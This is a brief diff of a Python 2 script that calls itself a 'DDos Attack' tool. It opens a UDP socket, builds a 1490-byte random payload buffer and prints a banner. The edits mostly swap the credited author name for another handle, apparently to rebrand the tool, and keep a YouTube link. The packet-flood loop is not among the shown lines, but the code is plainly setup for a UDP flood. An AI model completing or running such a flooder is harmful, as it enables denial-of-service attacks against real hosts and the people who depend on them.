@@ -1,7 +1,9 @@
 import os
-import sys
+#######
 import random
+#######
 import socket
+#######
 import time
 os.system("apt-get install figlet")
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -9,7 +11,7 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "                   Deepkul Roy"
+print "                   Hacx-Star"
 print
 print "You Tube : https://youtube.com/channel/UCJn2-qHoPUSgWe2focJVeUQ"
 print
